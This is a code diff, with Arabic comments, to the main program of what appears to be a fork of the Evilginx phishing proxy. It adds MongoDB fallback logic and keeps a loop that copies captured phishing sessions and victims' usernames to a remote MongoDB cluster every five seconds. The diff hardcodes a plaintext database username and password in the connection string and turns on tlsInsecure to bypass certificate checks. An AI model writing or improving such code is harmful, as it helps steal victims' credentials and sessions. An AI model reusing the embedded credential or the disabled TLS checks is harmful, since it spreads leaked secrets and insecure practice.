@@ -150,32 +150,41 @@ func main() {
 	var buntDb *database.Database
 
 	// استخدام MongoDB بشكل افتراضي دائمًا
-	// استخدام عنوان MongoDB الثابت
-	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+	// استخدام عنوان MongoDB الثابت بإعدادات إضافية لتجاوز مشاكل TLS
+	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
 	db_name := "evilginx"
 
 	fmt.Printf("\n\n")
 	fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))
 
+	var mongo_db *database.MongoDatabase
+	var mongoConnected bool = false
+	
 	mongo_db, err := database.NewMongoDatabase(mongo_uri, db_name)
 	if err != nil {
-		log.Fatal("%v", err)
+		log.Error("فشل الاتصال بـ MongoDB: %v", err)
+		log.Warning("سيتم استخدام BuntDB فقط بدون مزامنة مع MongoDB")
+		mongoConnected = false
+	} else {
+		mongoConnected = true
+		db = mongo_db
+		log.Success("تم الاتصال بـ MongoDB بنجاح!")
 	}
-	db = mongo_db
 
 	fmt.Printf(lg("تم") + e)
 	
-	// تنبيه بأن بعض الوظائف قد لا تعمل مع MongoDB حتى يتم تحديث الكود
-	fmt.Printf("\n" + lr(" تنبيه: ") + "دعم MongoDB لا يزال تجريبياً. بعض الوظائف قد لا تعمل بشكل صحيح.")
-	
-	// سنستخدم BuntDB أيضًا كنسخة احتياطية للوظائف التي لا تدعم MongoDB بعد
-	// هذا حل مؤقت حتى يتم تحديث الكود بالكامل
+	// سنستخدم BuntDB دائمًا كقاعدة بيانات أساسية
 	tmpPath := filepath.Join(*cfg_dir, "tmp_bunt.db")
 	fdb, err := database.NewDatabase(tmpPath)
 	if err != nil {
 		log.Fatal("%v", err)
 	}
 	buntDb = fdb
+	
+	// إذا لم نتمكن من الاتصال بـ MongoDB، سنستخدم BuntDB كقاعدة بيانات أساسية
+	if !mongoConnected {
+		db = buntDb
+	}
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
 	if err != nil {
@@ -222,17 +231,19 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
 	
 	// تأكد من مزامنة أي جلسات حالية في BuntDB
-	log.Info("مزامنة الجلسات الحالية من BuntDB إلى MongoDB...")
-	syncSessionsToMongoDB(buntDb, db)
-	
-	// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
-	// استخدام فترة أقصر (5 ثوان) للتأكد من مزامنة الجلسات بسرعة
-	go func() {
-		for {
-			time.Sleep(5 * time.Second)  // كل 5 ثوان
-			syncSessionsToMongoDB(buntDb, db)
-		}
-	}()
+	if mongoConnected {
+		log.Info("مزامنة الجلسات الحالية من BuntDB إلى MongoDB...")
+		syncSessionsToMongoDB(buntDb, db)
+		
+		// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
+		// استخدام فترة أقصر (5 ثوان) للتأكد من مزامنة الجلسات بسرعة
+		go func() {
+			for {
+				time.Sleep(5 * time.Second)  // كل 5 ثوان
+				syncSessionsToMongoDB(buntDb, db)
+			}
+		}()
+	}
 	
 	hp.Start()
 
@@ -270,7 +281,19 @@ func main() {
 
 // syncSessionsToMongoDB ينقل الجلسات من BuntDB إلى MongoDB
 func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase) {
+	// التحقق من أن قاعدة البيانات غير فارغة
+	if mongoDb == nil {
+		log.Error("فشل المزامنة: قاعدة بيانات MongoDB غير متصلة")
+		return
+	}
+	
 	log.Debug("بدء مزامنة الجلسات من BuntDB إلى MongoDB...")
+	
+	// التحقق من أن BuntDB غير فارغة
+	if buntDb == nil {
+		log.Error("فشل المزامنة: قاعدة بيانات BuntDB غير متصلة")
+		return
+	}
 	
 	sessions, err := buntDb.ListSessions()
 	if err != nil {
@@ -289,6 +312,12 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 	for _, s := range sessions {
 		log.Debug("محاولة مزامنة الجلسة %s (Phishlet: %s)...", s.SessionId, s.Phishlet)
 		
+		// تجاهل الجلسات بدون معرف
+		if s.SessionId == "" {
+			log.Warning("تم تجاهل جلسة بدون معرف SID")
+			continue
+		}
+		
 		// تحقق ما إذا كانت الجلسة موجودة بالفعل في MongoDB
 		_, err := mongoDb.GetSessionBySid(s.SessionId)
 		if err != nil {
@@ -301,7 +330,7 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 				continue
 			}
 			
-			// نقل البيانات الأخرى
+			// نقل البيانات الأخرى مع التحقق من الخطأ في كل خطوة
 			if s.Username != "" {
 				log.Debug("تحديث اسم المستخدم للجلسة %s: %s", s.SessionId, s.Username)
 				err = mongoDb.SetSessionUsername(s.SessionId, s.Username)
